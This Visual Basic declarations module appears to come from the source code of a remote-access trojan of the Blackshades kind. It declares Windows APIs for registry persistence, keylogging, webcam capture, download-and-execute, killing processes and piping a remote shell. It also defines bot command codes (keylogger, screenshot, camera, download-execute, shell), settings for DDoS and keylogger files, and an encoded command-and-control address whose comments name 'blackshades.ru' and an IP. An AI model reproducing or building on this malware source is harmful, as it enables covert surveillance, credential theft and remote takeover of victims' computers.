Attribute VB_Name = "modDeclarations"
Public Declare Function RegCreateKey Lib "advapi32" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Public Declare Function RegOpenKey Lib "advapi32" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Public Declare Function RegSetValueEx Lib "advapi32" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Public Declare Function RegDeleteValue Lib "advapi32" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long
Public Declare Function RegCloseKey Lib "advapi32" (ByVal hKey As Long) As Long
Public Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, ByRef lpType As Long, ByRef lpData As Any, ByRef lpcbData As Long) As Long
Public Declare Function GetFileSize Lib "kernel32" (ByVal hFile As Long, lpFileSizeHigh As Long) As Long

Public Declare Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
Public Declare Function CreateMutex Lib "kernel32" Alias "CreateMutexA" (ByVal lpMutexAttributes As Long, ByVal bInitialOwner As Long, ByVal lpName As String) As Long
Public Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Public Declare Function ReleaseMutex Lib "kernel32" (ByVal hMutex As Long) As Long
Public Declare Function GetVolumeSerialNumber Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Long, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Long) As Long

Public Declare Function IsNTAdmin Lib "advpack.dll" (ByVal dwReserved As Long, ByRef lpdwReserved As Long) As Long
Public Declare Function GetTickCount Lib "kernel32.dll" () As Long
Public Declare Function GetLocaleInfo Lib "kernel32" Alias "GetLocaleInfoA" (ByVal Locale As Long, ByVal LCType As Long, ByVal lpLCData As String, ByVal cchData As Long) As Long
Public Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Long, ByVal lpszName As String, ByVal cbName As Long, ByVal lpszVer As String, ByVal cbVer As Long) As Boolean
Public Declare Function GetLastInputInfo Lib "user32" (plii As Any) As Long
Public Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function CreateFile Lib "kernel32.dll" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, ByVal lpSecurityAttributes As Long, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
Public Declare Function WriteFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Any, ByVal nNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, ByVal lpOverlapped As Long) As Long
Public Declare Function SetFilePointer Lib "kernel32.dll" (ByVal hFile As Long, ByVal lDistanceToMove As Long, lpDistanceToMoveHigh As Long, ByVal dwMoveMethod As Long) As Long
Public Declare Function FlushFileBuffers Lib "kernel32" (ByVal hFile As Long) As Long
Public Declare Function GetForegroundWindow Lib "user32" () As Long
Public Declare Function DeleteUrlCacheEntry Lib "WinInet.dll" Alias "DeleteUrlCacheEntryA" (ByVal lpszUrlName As String) As Long
Public Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function capCreateCaptureWindow Lib "avicap32" Alias "capCreateCaptureWindowA" (ByVal lpszWindowName As String, ByVal dwStyle As Long, ByVal x As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hWndParent As Long, ByVal nID As Long) As Long
Public Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Public Declare Function Thread32First Lib "kernel32" (ByVal hSnapshot As Long, lpTE As THREADENTRY32) As Long
Public Declare Function Thread32Next Lib "kernel32" (ByVal hSnapshot As Long, lpTE As THREADENTRY32) As Long
Public Declare Function TerminateThread Lib "kernel32" (ByVal hThread As Long, ByVal dwExitCode As Long) As Long
Public Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessID As Long) As Long
Public Declare Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
Public Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As Long
Public Declare Function OpenThread Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessID As Long) As Long
Public Declare Function SuspendThread Lib "kernel32" (ByVal hThread As Long) As Long
Public Declare Function ResumeThread Lib "kernel32" (ByVal hThread As Long) As Long
Public Declare Function OpenSCManager Lib "advapi32" Alias "OpenSCManagerA" (ByVal lpMachineName As String, ByVal lpDatabaseName As String, ByVal dwDesiredAccess As Long) As Long
Public Declare Function OpenService Lib "advapi32" Alias "OpenServiceA" (ByVal hSCManager As Long, ByVal lpServiceName As String, ByVal dwDesiredAccess As Long) As Long
Public Declare Function StartService Lib "advapi32" Alias "StartServiceA" (ByVal hService As Long, ByVal dwNumServiceArgs As Long, ByVal lpServiceArgVectors As Long) As Long
Public Declare Function ControlService Lib "advapi32" (ByVal hService As Long, ByVal dwControl As Long, lpServiceStatus As SERVICE_STATUS) As Long
Public Declare Function CloseServiceHandle Lib "advapi32" (ByVal hSCObject As Long) As Long
Public Declare Function CreatePipe Lib "kernel32" (phReadPipe As Long, phWritePipe As Long, lpPipeAttributes As Any, ByVal nSize As Long) As Long
Public Declare Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As Long, ByVal lpCommandLine As String, lpProcessAttributes As SECURITY_ATTRIBUTES, lpThreadAttributes As SECURITY_ATTRIBUTES, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Public Declare Function ReadFile Lib "kernel32" (ByVal hFile As Long, ByVal lpBuffer As String, ByVal nNumberOfBytesToRead As Long, lpNumberOfBytesRead As Long, ByVal lpOverlapped As Any) As Long
Public Declare Sub ExitProcess Lib "kernel32" (ByVal uExitCode As Long)

Public Declare Function MoveFileEx Lib "kernel32" Alias "MoveFileExA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal dwFlags As Long) As Long

Public Const NORMAL_PRIORITY_CLASS = &H20&
Public Const STARTF_USESTDHANDLES = &H100&
Public Const STARTF_USESHOWWINDOW = &H1

Public Const GENERIC_WRITE = &H40000000
Public Const GENERIC_READ = &H80000000
Public Const FILE_ATTRIBUTE_NORMAL = &H80
Public Const CREATE_ALWAYS = 2
Public Const OPEN_ALWAYS = 4
Public Const FILE_BEGIN = 0

Public Const GENERIC_EXECUTE = &H20000000
Public Const SERVICE_CONTROL_STOP = 1
Public Const SERVICE_CONTROL_PAUSE = 2
Public Const SERVICE_CONTROL_CONTINUE = 3

Public Const WM_CAP_DLG_VIDEOFORMAT As Integer = &H429
Public Const WM_CAP_DRIVER_CONNECT As Integer = &H40A
Public Const WM_CAP_DRIVER_DISCONNECT As Integer = &H40B
Public Const WM_CAP_EDIT_COPY As Integer = &H41E
Public Const WM_CAP_SET_PREVIEW As Integer = &H432
Public Const WM_CAP_SET_PREVIEWRATE As Integer = &H434
Public Const WM_CAP_SET_SCALE As Integer = &H435
Public Const WS_CHILD As Long = &H40000000
Public Const WM_CAP_GRAB_FRAME As Long = (&H400 + 60)
Public Const SPI_SETDESKWALLPAPER = 20

Public Const THREAD_SUSPEND_RESUME = &H2&
Public Const TH32CS_SNAPHEAPLIST = &H1
Public Const TH32CS_SNAPTHREAD = &H4
Public Const TH32CS_SNAPMODULE = &H8
Public Const TH32CS_SNAPPROCESS = &H2&
Public Const TH32CS_SNAPALL = TH32CS_SNAPPROCESS + TH32CS_SNAPHEAPLIST + TH32CS_SNAPTHREAD + TH32CS_SNAPMODULE
Public Const TH32CS_SUSPENDRESUME = &H2

Public Type SERVICE_STATUS
  dwServiceType As Long
  dwCurrentState As Long
  dwControlsAccepted As Long
  dwWin32ExitCode As Long
  dwServiceSpecificExitCode As Long
  dwCheckPoint As Long
  dwWaitHint As Long
End Type

Public Type SECURITY_ATTRIBUTES
    nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type

Public Type STARTUPINFO
    cb As Long
    lpReserved As Long
    lpDesktop As Long
    lpTitle As Long
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Public Type PROCESS_INFORMATION
   hProcess As Long
   hThread As Long
   dwProcessID As Long
   dwThreadId As Long
End Type

Public Type ENUM_SETTINGS
    TARGET As String
    Port As Long
    ENC_KEY As String
    PATH_ROOT As String
    INTERVAL_ALIVE As Long
    INTERVAL_CMD As Long
    INTERVAL_DDOS As Long
    INTERVAL_CONFIG As Long
    PASSWORD As String
    INSTALL_STARTUP As String
    INSTALL_FILENAME As String
    INSTALL_MUTEX As String
    INSTALL_KLGNAME As String
End Type

Public Type THREADENTRY32
   dwSize As Long
   cntUsage As Long
   th32ThreadID As Long
   th32OwnerProcessID As Long
   tpBasePri As Long
   tpDeltaPri As Long
   dwFlags As Long
End Type

Public Type LASTINPUTINFO
    cbSize As Long
    dwTime As Long
End Type

Public Enum PACKET_ID_BOT
    INFO = 50
    id = 51
    KLG = 52
    SCR = 53
    PING = 54
    DLOAD_EXEC = 55
    UNINSTALL = 56
    CAM = 57
    PRC = 58
    SRV = 59
    CAM_DRIVER = 60
    SRV_PING = 61
    Shell = 62
End Enum

Public Const USER_ID As Long = 10 'User's ID from DB

Public Const PACKET_INFO As String = "0"
Public Const PACKET_OK As String = "1"

'Public Const HOME_DNS As String = "10012C02021D0E130928124707081402" 'blackshades.ru
'Public Const HOME_DNS As String = "x00x00.mine.nu" 'blackshades.ru
'Public Const HOME_DNS As String = "172.17.30.119"
Public Const HOME_DNS As String = "475D63535A4054415463505C" '50.23.239.15

Public Const USER_AGENT As String = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1) Gecko/20090612 Firefox/3.5"

Public Const REVERSE_RELAY_START As String = "x119"

Public COUNTRY As String

Public strPWS As String
Public strPcInfo As String
Public STEAM_ENABLED As Boolean

Public PacketSize As Long
Public PacketBuffer As String
Public PacketHeader As String

Public SETTINGS As ENUM_SETTINGS

Public lngMutex As Long

Public mCaphWnd As Long
